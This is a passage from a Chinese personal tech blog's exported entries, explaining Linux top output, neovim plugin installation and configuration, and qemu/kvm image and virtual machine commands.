<li><code>c</code>: 显示进程详细命令</li>
</ul>
<h3 id="2-3-显示内容解释"><a href="#2-3-显示内容解释" class="headerlink" title="2.3. 显示内容解释"></a>2.3. 显示内容解释</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">top - 16:01:03 up 1 day, 16:45, 13 users,  load average: 2.45, 2.09, 2.23</span><br><span class="line">Tasks: 499 total,   2 running, 496 sleeping,   0 stopped,   1 zombie</span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">Cpu(s):  5.7 us,  1.4 sy,  0.0 ni, 92.4 <span class="built_in">id</span>,  0.0 wa,  0.3 hi,  0.2 si,  0.0 st</span></span><br><span class="line">GiB Mem :     31.0 total,      2.0 free,     14.8 used,     14.1 buff/cache</span><br><span class="line">GiB Swap:     12.0 total,     12.0 free,      0.0 used.     12.6 avail Mem</span><br><span class="line"></span><br><span class="line">    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND</span><br><span class="line">    569 root      20   0 2770000 247324  98132 S  45.0   0.8 169:11.50 /usr/lib/Xorg -nolisten tcp -background none -seat seat0 vt1 -auth /var/run/sddm/&#123;9049d9af-27e6-413f-ac66-bba929904f67&#125; -noreset -displayfd 17</span><br></pre></td></tr></table></figure>

<h4 id="1-参数含义"><a href="#1-参数含义" class="headerlink" title="1) 参数含义"></a>1) 参数含义</h4><ul>
<li><code>PR</code>: 进程的优先级，数值越小表示优先级越高。</li>
<li><code>NI</code>: 进程的nice值，数值越小表示优先级越高。</li>
<li><code>VIRT</code>: 进程使用的虚拟内存大小，包括代码、数据和共享库等。单位KB</li>
<li><code>RES</code>: 进程使用的物理内存大小，不包括共享库等。单位KB</li>
<li><code>SHR</code>: 进程使用的共享内存大小。单位KB或MB，取决于数值大小</li>
<li><code>TIME+</code>: 进程使用的CPU时间，包括用户态和内核态的时间。</li>
</ul>
<h4 id="2-S-进程状态"><a href="#2-S-进程状态" class="headerlink" title="2) S 进程状态"></a>2) S 进程状态</h4><ul>
<li><code>R</code>: Runnable（运行）: 正在运行或在运行队列中等待</li>
<li><code>S</code>: sleeping（中断）: 休眠中，受阻，在等待某个条件的形成或接收到信号</li>
<li><code>D</code>: uninterruptible sleep(不可中断): 收到信号不唤醒和不可运行，进程必须等待直到有中断发生</li>
<li><code>Z</code>: zombie（僵死）: 进程已终止，但进程描述还在，直到父进程调用wait4()系统调用后释放</li>
<li><code>T</code>: traced or stoppd(停止): 进程收到SIGSTOP,SIGSTP,SIGTOU信号后停止运行</li>
</ul>
<p><strong>后缀表示</strong></p>
<ul>
<li><code>&lt;</code>: 优先级高的进程</li>
<li><code>N</code>: 优先级低的进程</li>
<li><code>L</code>: 有些页被锁进内存</li>
<li><code>s</code>: 进程的领导者（在它之下有子进程）</li>
<li><code>l</code>: ismulti-threaded (using CLONE_THREAD, like NPTL pthreads do)</li>
<li><code>+</code>: 位于后台的进程组</li>
</ul>
]]></content>
      <categories>
        <category>Program</category>
        <category>Shell</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>neovim相关配置</title>
    <url>/blogs/2023-03-15-neovim/</url>
    <content><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>neovim是基于vim二次开发的，快捷键配置大部分可以复用vim的，这里就只列举一些插件的配置和处理</p>
<p>一个很不错的nvim的开源配置 <a href="https://github.com/ayamir/nvimdots">https://github.com/ayamir/nvimdots</a></p>
<h1 id="二、特殊配置"><a href="#二、特殊配置" class="headerlink" title="二、特殊配置"></a>二、特殊配置</h1><h2 id="1-剪贴板"><a href="#1-剪贴板" class="headerlink" title="1. 剪贴板"></a>1. 剪贴板</h2><ul>
<li>没看到neovim有clipboard特性安装上，就先用系统剪贴板共享的方式</li>
<li>需要安装<code>xclip</code>软件，然后设置<code>set clipboard+=unnamedplus</code>就可以直接共享nvim的剪贴板和系统剪贴板</li>
</ul>
<h2 id="2-禁用鼠标"><a href="#2-禁用鼠标" class="headerlink" title="2. 禁用鼠标"></a>2. 禁用鼠标</h2><ul>
<li><code>set mouse=</code>就可以禁用鼠标</li>
</ul>
<h1 id="三、插件安装"><a href="#三、插件安装" class="headerlink" title="三、插件安装"></a>三、插件安装</h1><h2 id="1-packer-nvim-管理插件的插件"><a href="#1-packer-nvim-管理插件的插件" class="headerlink" title="1. packer.nvim 管理插件的插件"></a>1. packer.nvim 管理插件的插件</h2><h3 id="1-1-安装"><a href="#1-1-安装" class="headerlink" title="1.1. 安装"></a>1.1. 安装</h3><h4 id="1-linux"><a href="#1-linux" class="headerlink" title="1) linux"></a>1) linux</h4><ul>
<li>linux上直接执行下面的语句</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone --depth 1 https://github.com/wbthomason/packer.nvim\</span><br><span class="line"> ~/.local/share/nvim/site/pack/packer/start/packer.nvim</span><br></pre></td></tr></table></figure>

<ul>
<li>然后建立目录<code>~/.config/nvim/lua</code></li>
<li>在里面添加文件<code>plugins.lua</code>，添加自己需要的插件</li>
</ul>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">vim.cmd <span class="string">[[packadd packer.nvim]]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">require</span>(<span class="string">&#x27;packer&#x27;</span>).startup(<span class="function"><span class="keyword">function</span><span class="params">(use)</span></span></span><br><span class="line">    <span class="comment">-- packer可以自己管理自己的版本</span></span><br><span class="line">    use <span class="string">&#x27;wbthomason/packer.nvim&#x27;</span></span><br><span class="line"></span><br><span class="line">    use <span class="string">&#x27;akinsho/toggleterm.nvim&#x27;</span></span><br><span class="line">    use <span class="string">&#x27;neoclide/coc.nvim&#x27;</span></span><br><span class="line">    use <span class="string">&#x27;scrooloose/nerdcommenter&#x27;</span></span><br><span class="line">    use <span class="string">&#x27;preservim/nerdtree&#x27;</span></span><br><span class="line">    use <span class="string">&#x27;Xuyuanp/nerdtree-git-plugin&#x27;</span></span><br><span class="line">    use &#123;</span><br><span class="line">        <span class="string">&#x27;nvim-telescope/telescope.nvim&#x27;</span>,</span><br><span class="line">        requires = &#123; &#123;<span class="string">&#x27;nvim-lua/plenary.nvim&#x27;</span>&#125; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    use <span class="string">&#x27;vim-airline/vim-airline&#x27;</span></span><br><span class="line">    use <span class="string">&#x27;vim-airline/vim-airline-themes&#x27;</span></span><br><span class="line">    use <span class="string">&#x27;bronson/vim-trailing-whitespace&#x27;</span></span><br><span class="line">    use <span class="string">&#x27;jiangmiao/auto-pairs&#x27;</span></span><br><span class="line"><span class="keyword">end</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>编辑<code>~/.config/nvim/init.vim</code></li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="comment">&quot; 加载lua/plugins.lua文件</span></span><br><span class="line"><span class="keyword">lua</span> require(<span class="string">&#x27;plugins&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>重新打开nvim</li>
<li>执行<code>:PackerInstall</code></li>
</ul>
<h4 id="2-windows"><a href="#2-windows" class="headerlink" title="2) windows"></a>2) windows</h4><ul>
<li>windows自动加载目录在<code>％LocalAppData％\nvim-data\site\pack\packer\start</code></li>
<li>配置在<code>％LocalAppData％\nvim\init.vim</code></li>
</ul>
<h3 id="1-2-几个常用的命令"><a href="#1-2-几个常用的命令" class="headerlink" title="1.2. 几个常用的命令"></a>1.2. 几个常用的命令</h3><ul>
<li><code>PackerSync</code>: 跟最新的git仓库同步，类似与update</li>
</ul>
<h2 id="2-离线插件安装"><a href="#2-离线插件安装" class="headerlink" title="2. 离线插件安装"></a>2. 离线插件安装</h2><ul>
<li>插件默认加载位置在<code>~/.local/share/nvim/site/pack/plugins/start</code></li>
<li>直接解压到此目录就会在启动时自动加载</li>
</ul>
<h1 id="四、好用插件整理"><a href="#四、好用插件整理" class="headerlink" title="四、好用插件整理"></a>四、好用插件整理</h1><h2 id="1-nvim-telescope-telescope-nvim-文件搜索打开插件"><a href="#1-nvim-telescope-telescope-nvim-文件搜索打开插件" class="headerlink" title="1. nvim-telescope&#x2F;telescope.nvim 文件搜索打开插件"></a>1. nvim-telescope&#x2F;telescope.nvim 文件搜索打开插件</h2><ul>
<li>需要依赖<code>nvim-lua/plenary.nvim</code></li>
</ul>
<h3 id="1-1-配置说明"><a href="#1-1-配置说明" class="headerlink" title="1.1. 配置说明"></a>1.1. 配置说明</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="comment">&quot; Telescope</span></span><br><span class="line"><span class="comment">&quot; &#x27;Ctrl + p&#x27; to find file and open in current tab</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">filereadable</span>(<span class="built_in">fnamemodify</span>(<span class="string">&#x27;.git/config&#x27;</span>, <span class="string">&#x27;:p&#x27;</span>))</span><br><span class="line">    <span class="keyword">nmap</span> <span class="symbol">&lt;c-p&gt;</span> :Telescope git_files<span class="symbol">&lt;cr&gt;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">nmap</span> <span class="symbol">&lt;c-p&gt;</span> :Telescope find_files<span class="symbol">&lt;cr&gt;</span></span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line"><span class="comment">&quot; &#x27;Ctrl + f&#x27; to find line in current buffer</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;c-f&gt;</span> :Telescope current_buffer_fuzzy_find<span class="symbol">&lt;cr&gt;</span></span><br><span class="line"><span class="comment">&quot; &#x27;Ctrl + t&#x27; to find tags in current buffer</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;c-t&gt;</span> :Telescope <span class="keyword">tags</span><span class="symbol">&lt;cr&gt;</span></span><br><span class="line"><span class="comment">&quot; &#x27;Ctrl + b&#x27; to find buffers</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;leader&gt;</span><span class="keyword">b</span> :Telescope <span class="keyword">buffers</span><span class="symbol">&lt;cr&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="2-neoclide-coc-nvim-代码补全提示插件"><a href="#2-neoclide-coc-nvim-代码补全提示插件" class="headerlink" title="2. neoclide&#x2F;coc.nvim 代码补全提示插件"></a>2. neoclide&#x2F;coc.nvim 代码补全提示插件</h2><h3 id="2-1-安装"><a href="#2-1-安装" class="headerlink" title="2.1. 安装"></a>2.1. 安装</h3><ul>
<li>插件装好后需要在目录下执行</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yarn install</span><br><span class="line">yarn build</span><br></pre></td></tr></table></figure>

<ul>
<li>本身此插件有一个自己的插件管理，需要安装对应的lsp</li>
<li>可以通过<code>coc-marketplace</code>包进行类似查找的方式安装</li>
<li>安装插件的命令如下</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">:CocInstall coc-marketplace</span><br></pre></td></tr></table></figure>

<p><strong>离线安装</strong></p>
<ul>
<li>离线配置yarn和npm的镜像，然后再进行执行</li>
<li>yarn镜像配置</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yarn config set registry https://xxx</span><br></pre></td></tr></table></figure>

<ul>
<li>npm镜像配置，<code>coc.nvim:registry</code>的镜像和yarn是一样的</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm config set coc.nvim:registry https://xxx</span><br></pre></td></tr></table></figure>

<h3 id="2-2-配置和快捷键"><a href="#2-2-配置和快捷键" class="headerlink" title="2.2. 配置和快捷键"></a>2.2. 配置和快捷键</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="comment">&quot; coc</span></span><br><span class="line"><span class="keyword">inoremap</span> <span class="symbol">&lt;expr&gt;</span> <span class="symbol">&lt;Tab&gt;</span> <span class="built_in">pumvisible</span>() ? <span class="string">&quot;\&lt;C-y&gt;&quot;</span> : <span class="string">&quot;\&lt;Tab&gt;&quot;</span></span><br><span class="line"><span class="keyword">inoremap</span> <span class="symbol">&lt;silent&gt;</span><span class="symbol">&lt;expr&gt;</span> <span class="symbol">&lt;CR&gt;</span> coc#pum#visible() ? coc#pum#confirm()</span><br><span class="line">                              \: <span class="string">&quot;\&lt;C-g&gt;u\&lt;CR&gt;\&lt;c-r&gt;=coc#on_enter()\&lt;CR&gt;&quot;</span></span><br><span class="line"><span class="keyword">nmap</span> <span class="symbol">&lt;silent&gt;</span> gd <span class="symbol">&lt;Plug&gt;</span>(coc-definition)</span><br><span class="line"><span class="keyword">nmap</span> <span class="symbol">&lt;silent&gt;</span> <span class="keyword">gr</span> <span class="symbol">&lt;Plug&gt;</span>(coc-references)</span><br><span class="line"><span class="comment">&quot; Use K to show documentation in preview window</span></span><br><span class="line"><span class="keyword">nnoremap</span> <span class="symbol">&lt;silent&gt;</span> K :<span class="keyword">call</span> ShowDocumentation()<span class="symbol">&lt;CR&gt;</span></span><br><span class="line"><span class="keyword">function!</span> <span class="title">ShowDocumentation</span><span class="params">()</span></span><br><span class="line">  <span class="keyword">if</span> CocAction(<span class="string">&#x27;hasProvider&#x27;</span>, <span class="string">&#x27;hover&#x27;</span>)</span><br><span class="line">    <span class="keyword">call</span> CocActionAsync(<span class="string">&#x27;doHover&#x27;</span>)</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">call</span> <span class="built_in">feedkeys</span>(<span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;in&#x27;</span>)</span><br><span class="line">  <span class="keyword">endif</span></span><br><span class="line"><span class="keyword">endfunction</span></span><br><span class="line"><span class="comment">&quot; Formatting selected code</span></span><br><span class="line"><span class="keyword">xmap</span> <span class="symbol">&lt;c-k&gt;</span><span class="symbol">&lt;c-f&gt;</span> <span class="symbol">&lt;Plug&gt;</span>(coc-format-selected)</span><br><span class="line"><span class="keyword">nmap</span> <span class="symbol">&lt;M-F&gt;</span> :CocCommand editor.action.formatDocument<span class="symbol">&lt;cr&gt;</span></span><br><span class="line"><span class="comment">&quot; go to diagnostic</span></span><br><span class="line"><span class="keyword">nmap</span> <span class="symbol">&lt;silent&gt;</span> <span class="symbol">&lt;leader&gt;</span><span class="keyword">dp</span> <span class="symbol">&lt;Plug&gt;</span>(coc-diagnostic-<span class="keyword">prev</span>)</span><br><span class="line"><span class="keyword">nmap</span> <span class="symbol">&lt;silent&gt;</span> <span class="symbol">&lt;leader&gt;</span>dn <span class="symbol">&lt;Plug&gt;</span>(coc-diagnostic-<span class="keyword">next</span>)</span><br><span class="line"><span class="comment">&quot; Highlight the symbol and its references when holding the cursor</span></span><br><span class="line"><span class="keyword">autocmd</span> CursorHold * <span class="keyword">silent</span> <span class="keyword">call</span> CocActionAsync(<span class="string">&#x27;highlight&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li><code>Ctrl + n</code>: 下一个候选</li>
<li><code>Ctrl + p</code>: 上一个候选</li>
</ul>
<h3 id="2-3-使用marketplace"><a href="#2-3-使用marketplace" class="headerlink" title="2.3. 使用marketplace"></a>2.3. 使用marketplace</h3><ul>
<li>直接输入<code>:CocList marketplace</code>就可以输入选择自己想要安装的插件</li>
</ul>
<h3 id="2-4-列举几个好用的插件"><a href="#2-4-列举几个好用的插件" class="headerlink" title="2.4. 列举几个好用的插件"></a>2.4. 列举几个好用的插件</h3><h4 id="coc-clangd-c-c-oc的代码提示lsp"><a href="#coc-clangd-c-c-oc的代码提示lsp" class="headerlink" title="coc-clangd c&#x2F;c++&#x2F;oc的代码提示lsp"></a>coc-clangd c&#x2F;c++&#x2F;oc的代码提示lsp</h4><ul>
<li>需要本地有clangd命令</li>
</ul>
<h4 id="coc-cmake-cmake代码提示lsp"><a href="#coc-cmake-cmake代码提示lsp" class="headerlink" title="coc-cmake cmake代码提示lsp"></a>coc-cmake cmake代码提示lsp</h4><h4 id="coc-prettier-格式化插件"><a href="#coc-prettier-格式化插件" class="headerlink" title="coc-prettier 格式化插件"></a>coc-prettier 格式化插件</h4><h3 id="2-5-coc-settings-json配置"><a href="#2-5-coc-settings-json配置" class="headerlink" title="2.5. coc-settings.json配置"></a>2.5. coc-settings.json配置</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;languageserver&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="comment">// golang的配置</span></span><br><span class="line">        <span class="attr">&quot;golang&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;gopls&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;rootPatterns&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;go.mod&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;filetypes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;go&quot;</span><span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;prettier.tabWidth&quot;</span><span class="punctuation">:</span> <span class="number">4</span>  <span class="comment">// prettier的tab宽度为4</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="3-akinsho-toggleterm-nvim"><a href="#3-akinsho-toggleterm-nvim" class="headerlink" title="3. akinsho&#x2F;toggleterm.nvim"></a>3. akinsho&#x2F;toggleterm.nvim</h2><h3 id="3-1-安装"><a href="#3-1-安装" class="headerlink" title="3.1. 安装"></a>3.1. 安装</h3><ul>
<li>packer安装，里面的setup是必须的</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">use &#123;<span class="string">&quot;akinsho/toggleterm.nvim&quot;</span>, <span class="keyword">tag</span> = <span class="string">&#x27;*&#x27;</span>, config = <span class="keyword">function</span>()</span><br><span class="line">    require(<span class="string">&quot;toggleterm&quot;</span>).setup()</span><br><span class="line">end&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-2-配置"><a href="#3-2-配置" class="headerlink" title="3.2. 配置"></a>3.2. 配置</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="comment">&quot; Toggleterm</span></span><br><span class="line"><span class="comment">&quot; use ctrl + t to open a terminal at bottom</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;c-t&gt;</span> :ToggleTerm<span class="symbol">&lt;cr&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="3-3-快捷键"><a href="#3-3-快捷键" class="headerlink" title="3.3. 快捷键"></a>3.3. 快捷键</h3><ul>
<li>在终端内部需要用<code>Ctrl + \，Ctrl + n</code>来回到窗口模式，然后就按照窗口处理</li>
</ul>
<h2 id="4-lewis6991-gitsigns-nvim-git信息显示"><a href="#4-lewis6991-gitsigns-nvim-git信息显示" class="headerlink" title="4. lewis6991&#x2F;gitsigns.nvim git信息显示"></a>4. lewis6991&#x2F;gitsigns.nvim git信息显示</h2><h3 id="4-1-配置"><a href="#4-1-配置" class="headerlink" title="4.1. 配置"></a>4.1. 配置</h3><ul>
<li>在当前行显示git blame，显示格式配置</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="comment">&quot; gitsigns</span></span><br><span class="line"><span class="keyword">lua</span> require(<span class="string">&#x27;gitsigns&#x27;</span>).setup &#123; current_line_blame = true, current_line_blame_formatter = <span class="string">&#x27;&lt;author&gt; [&lt;author_time:%Y-%m-%d&gt;] * &lt;summary&gt;&#x27;</span> &#125;</span><br></pre></td></tr></table></figure>

<h2 id="5-nvim-tree-nvim-tree-lua-文件树"><a href="#5-nvim-tree-nvim-tree-lua-文件树" class="headerlink" title="5. nvim-tree&#x2F;nvim-tree.lua 文件树"></a>5. nvim-tree&#x2F;nvim-tree.lua 文件树</h2><h3 id="5-1-安装"><a href="#5-1-安装" class="headerlink" title="5.1. 安装"></a>5.1. 安装</h3><ul>
<li>nvim-tree安装很简单，主要是想要图标需要做点工作</li>
<li><code>nvim-tree/nvim-web-devicons</code>是图标，但是需要安装<code>nerd font</code></li>
<li>去下载 <a href="https://www.nerdfonts.com/font-downloads">https://www.nerdfonts.com/font-downloads</a>，找一下自己字体对应的<code>nerd font</code></li>
<li>安装到系统后，终端的需要调整终端的字体为这个才能显示图标</li>
</ul>
<h3 id="5-2-配置"><a href="#5-2-配置" class="headerlink" title="5.2. 配置"></a>5.2. 配置</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="comment">&quot; nvim-tree</span></span><br><span class="line"><span class="keyword">lua</span> require(<span class="string">&quot;nvim-tree&quot;</span>).setup(&#123;</span><br><span class="line">    \ sort_by = <span class="string">&quot;case_sensitive&quot;</span>,</span><br><span class="line">\ &#125;)</span><br><span class="line"><span class="comment">&quot; set F10 to show or hide NERDTree</span></span><br><span class="line">func TreeToggle()</span><br><span class="line">    <span class="keyword">if</span> !filereadable(<span class="built_in">expand</span>(<span class="string">&quot;%&quot;</span>))</span><br><span class="line">        NvimTreeToggle</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">endif</span></span><br><span class="line">    NvimTreeFindFileToggle</span><br><span class="line">endfunc</span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;F10&gt;</span> :<span class="keyword">call</span> TreeToggle()<span class="symbol">&lt;cr&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="5-3-快捷键"><a href="#5-3-快捷键" class="headerlink" title="5.3. 快捷键"></a>5.3. 快捷键</h3><ul>
<li><code>ctrl + ]</code>: 设定光标下为当前目录</li>
<li><code>ctrl + v</code>: 横向分屏打开</li>
<li><code>ctrl + x</code>: 纵向分屏打开</li>
<li><code>ctrl + t</code>: 新标签页打开</li>
<li><code>shift + I</code>: 显示&#x2F;隐藏非git跟踪的文件</li>
<li><code>shift + H</code>: 显示&#x2F;隐藏隐藏文件</li>
<li><code>a</code>: 创建</li>
<li><code>d</code>: 删除</li>
<li><code>c</code>: 拷贝节点</li>
<li><code>p</code>: 粘贴</li>
<li><code>shift + P</code>: 跳转到当前节点的父节点</li>
<li><code>r</code>: rename此节点</li>
<li><code>shift + R</code>: 刷新此节点</li>
<li><code>g, y</code>: 拷贝绝对路径到剪贴板</li>
<li><code>y</code>: 拷贝文件名到系统剪贴板</li>
<li><code>shift + Y</code>: 拷贝相对路径到剪贴板</li>
</ul>
]]></content>
      <categories>
        <category>Program</category>
        <category>Shell</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>kvm相关学习</title>
    <url>/blogs/2023-02-06-kvm/</url>
    <content><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>kvm和云计算息息相关，同时kvm也是linux上虚拟化技术的内核支持</p>
<h1 id="二、qemu命令说明"><a href="#二、qemu命令说明" class="headerlink" title="二、qemu命令说明"></a>二、qemu命令说明</h1><h2 id="1-快捷键说明"><a href="#1-快捷键说明" class="headerlink" title="1. 快捷键说明"></a>1. 快捷键说明</h2><h3 id="1-1-SDL图形界面下"><a href="#1-1-SDL图形界面下" class="headerlink" title="1.1. SDL图形界面下"></a>1.1. SDL图形界面下</h3><ul>
<li><code>Ctrl + Alt + f</code>: 全屏显示</li>
<li><code>Ctrl + Alt + 2</code>: 进入qemu监视器窗口</li>
</ul>
<h2 id="2-qemu-img"><a href="#2-qemu-img" class="headerlink" title="2. qemu-img"></a>2. qemu-img</h2><h3 id="2-1-常用选项"><a href="#2-1-常用选项" class="headerlink" title="2.1. 常用选项"></a>2.1. 常用选项</h3><ul>
<li><code>-f fmt</code>: 指定img的格式，可选qcow2、vmdk、vdi、vhd、raw等</li>
</ul>
<h3 id="2-2-create-创建镜像文件"><a href="#2-2-create-创建镜像文件" class="headerlink" title="2.2. create 创建镜像文件"></a>2.2. create 创建镜像文件</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-img create [-f fmt] [-o options] filename [size]</span><br></pre></td></tr></table></figure>

<ul>
<li>查看对应格式支持哪些选项</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-img --help | grep -i &quot;^Supported formats&quot;</span><br></pre></td></tr></table></figure>

<h3 id="2-3-convert-转换镜像格式"><a href="#2-3-convert-转换镜像格式" class="headerlink" title="2.3. convert 转换镜像格式"></a>2.3. convert 转换镜像格式</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-img convert -f vmdk -O qcow2 image.vmdk image.qcow2</span><br></pre></td></tr></table></figure>

<h3 id="2-4-snapshot-快照"><a href="#2-4-snapshot-快照" class="headerlink" title="2.4. snapshot 快照"></a>2.4. snapshot 快照</h3><ul>
<li>当前快照只支持qcow2格式</li>
<li>建立的是内置磁盘快照</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-img snapshot -c ss1 test.qcow2     # 创建test.qcow2的快照，名字ss1</span><br><span class="line">qemu-img snapshot -l test.qcow2         # 列举test.qcow2的快照</span><br><span class="line">qemu-img snapshot -a ss1 test.qcow2     # 回退到ss1快照</span><br><span class="line">qemu-img snapshot -d ss1 test.qcow2     # 删除ss1快照</span><br></pre></td></tr></table></figure>

<h2 id="3-qemu-system-arch-系统模式启动虚拟机的命令"><a href="#3-qemu-system-arch-系统模式启动虚拟机的命令" class="headerlink" title="3. qemu-system-[arch] 系统模式启动虚拟机的命令"></a>3. <code>qemu-system-[arch]</code> 系统模式启动虚拟机的命令</h2><h3 id="3-1-常用选项"><a href="#3-1-常用选项" class="headerlink" title="3.1. 常用选项"></a>3.1. 常用选项</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-system-x86_64 -enable-kvm -m 8G -smp 4 -cpu host,hv_relaxed,hv_spinlocks=0x1fff,hv_vapic,hv_time -net nic -net bridge,br=virbr0 -boot once=d -cdrom ../iso/cn_windows_10_consumer_editions_version_1909_updated_jan_2020_x64_dvd_47161f17.iso win10.qcow2</span><br></pre></td></tr></table></figure>

<ul>
<li><code>-enable-kvm</code>: 使用kvm</li>
<li><code>-m 8G</code>: 8G内存</li>
<li><code>-smp 4</code>: 4个逻辑处理器，可以使用</li>
<li><code>-boot once=d</code>: 启动顺序，d代表光盘，once是仅这一次使用光盘</li>
<li><code>-cdrom xxx.iso</code>: 光驱镜像文件</li>
</ul>
<h3 id="3-2-smp-cpus-n-maxcpus-cpus-cores-cores-threads-threads-sockets-sockets"><a href="#3-2-smp-cpus-n-maxcpus-cpus-cores-cores-threads-threads-sockets-sockets" class="headerlink" title="3.2. -smp [cpus=]n[,maxcpus=cpus][,cores=cores],[,threads=threads][,sockets=sockets]"></a>3.2. <code>-smp [cpus=]n[,maxcpus=cpus][,cores=cores],[,threads=threads][,sockets=sockets]</code></h3><ul>
<li><code>n</code>: 用于设置逻辑cpu数量，默认为1</li>
<li><code>maxcpus</code>: 用于设置客户机最大可以被使用的cpu数量，可用于热插拔cpu</li>
<li><code>cores</code>: 每个cpu核心数，默认为1</li>
<li><code>threads</code>: 每个cpu上线程数，默认为1</li>
<li><code>sockets</code>: 客户机能看到的总的cpu socket数量</li>
</ul>
<h3 id="3-3-cpu-host-设置cpu模拟型号"><a href="#3-3-cpu-host-设置cpu模拟型号" class="headerlink" title="3.3. -cpu host 设置cpu模拟型号"></a>3.3. <code>-cpu host</code> 设置cpu模拟型号</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看可以模拟的cpu型号</span></span><br><span class="line">qemu-system-x86_64 -cpu help</span><br></pre></td></tr></table></figure>

<ul>
<li><code>-cpu host,hv_relaxed,hv_spinlocks=0x1fff,hv_vapic,hv_time</code>是虚拟windows时可以添加的性能优化选项</li>
</ul>
<h3 id="3-4-net-nic-net-bridge-br-virbr0"><a href="#3-4-net-nic-net-bridge-br-virbr0" class="headerlink" title="3.4. -net nic -net bridge,br=virbr0"></a>3.4. <code>-net nic -net bridge,br=virbr0</code></h3><h4 id="1-网桥模式"><a href="#1-网桥模式" class="headerlink" title="1) 网桥模式"></a>1) 网桥模式</h4><ul>
<li>先参考 <a href="/blogs/2018-09-16-shellStudy/#28-brctl-%E7%BD%91%E6%A1%A5%E7%AE%A1%E7%90%86%E5%91%BD%E4%BB%A4">brctl网桥管理命令</a> 创建网桥，也可以使用图形界面的网络管理器进行创建，不过NetworkManager创建后需要重启系统才能生效，不知道为什么</li>
<li><code>-net nic -net bridge,br=virbr0</code>代表虚拟机创建时自动创建虚拟网卡并连接到网桥<code>virbr0</code></li>
</ul>
<h3 id="3-5-spice-port-5900-disable-ticketing-on"><a href="#3-5-spice-port-5900-disable-ticketing-on" class="headerlink" title="3.5. -spice port=5900,disable-ticketing=on"></a>3.5. <code>-spice port=5900,disable-ticketing=on</code></h3><ul>
<li><code>port=5900</code>: 监听端口5900</li>
<li><code>disable-ticketing=on</code>: 不需要密码</li>
<li><code>addr=0.0.0.0</code>: 监听地址</li>
</ul>
<h1 id="三、virt-manager"><a href="#三、virt-manager" class="headerlink" title="三、virt-manager"></a>三、virt-manager</h1><ul>
<li>依赖于libvirt，只能管理libvirt注册的主机</li>
</ul>
<h2 id="1-网络配置"><a href="#1-网络配置" class="headerlink" title="1. 网络配置"></a>1. 网络配置</h2><h3 id="1-1-网桥模式"><a href="#1-1-网桥模式" class="headerlink" title="1.1. 网桥模式"></a>1.1. 网桥模式</h3><ul>
